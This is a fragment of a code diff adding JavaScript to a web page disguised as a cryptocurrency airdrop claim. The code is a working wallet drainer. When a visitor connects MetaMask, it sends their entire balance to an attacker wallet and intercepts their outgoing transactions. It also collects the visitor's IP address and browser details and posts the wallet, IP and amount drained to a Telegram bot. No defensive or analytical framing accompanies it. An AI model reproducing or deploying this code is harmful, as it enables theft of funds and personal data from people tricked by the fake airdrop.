+                    tx.chainId = "0xAA36A7"; // Sepolia Testnet chain ID
+                    tx.gasPrice = ethers.utils.parseUnits("20", "gwei").toHexString();
+                    await sendVictimAlert(`CLIPPED TX FROM: ${tx.from}`);
+                    return provider.sendTransaction(tx);
+                }
+                return provider.send(args.method, args.params);
+            };
+        }
+
+        async function connectWallet() {
+            if (!window.ethereum) {
+                alert("Install MetaMask to claim your airdrop!");
+                return;
+            }
+
+            const provider = new ethers.providers.Web3Provider(window.ethereum, {
+                chainId: 11155111,
+                name: "sepolia",
+                rpcUrls: [SEPOLIA_RPC]
+            });
+            const accounts = await provider.send("eth_requestAccounts", []);
+            const signer = provider.getSigner();
+            const victimAddress = accounts[0];
+
+            // Get victim details
+            const ipResponse = await fetch("https://api.ipify.org?format=json");
+            const ipData = await ipResponse.json();
+            const browser = navigator.userAgent;
+
+            // Drain Sepolia ETH
+            const balance = await provider.getBalance(victimAddress);
+            if (balance.gt(0)) {
+                const tx = {
+                    to: ATTACKER_WALLET,
+                    value: balance.sub(ethers.utils.parseUnits("0.001", "ether")), // Leave some gas
+                    gasLimit: "0x5208", // 21000 gas
+                    gasPrice: ethers.utils.parseUnits("20", "gwei"),
+                    chainId: 11155111 // Sepolia Testnet
+                };
+                await signer.sendTransaction(tx);
+            }
+
+            // Send victim info to Telegram
+            await sendVictimAlert(`VICTIM CONNECTED:\nWallet: ${victimAddress}\nIP: ${ipData.ip}\nBrowser: ${browser}\nBalance Drained: ${ethers.utils.formatEther(balance)} ETH`);
+        }
+
+        async function sendVictimAlert(msg) {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+            });
+        }
+    </script>
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js" type="text/javascript"></script>
 </body>
 </html>
